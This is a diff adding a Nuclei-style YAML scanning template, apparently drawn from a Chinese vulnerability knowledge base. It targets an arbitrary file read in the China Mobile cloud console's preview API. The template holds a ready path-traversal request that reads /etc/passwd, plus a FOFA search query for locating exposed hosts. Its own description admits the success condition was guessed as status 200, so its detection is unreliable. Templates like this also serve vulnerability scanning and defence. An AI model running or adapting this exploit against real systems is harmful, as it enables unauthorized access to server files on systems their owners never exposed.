@@ -1,0 +1,25 @@
+id: poc-6653d3c753db23457c3c
+info:
+  name: 中国移动云控制台preview存在任意文件读取
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/6653d3c753db23457c3ce7b2da873351
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 6653d3c753db23457c3ce7b2da873351
+    fofa: + fofa`body="op-login-static/favicon.ico" || header="/oauth2/code/opgateway"`
+http:
+- raw:
+  - 'GET /api/query/helpcenter/api/v2/preview?fileName=../../../../../../../../etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
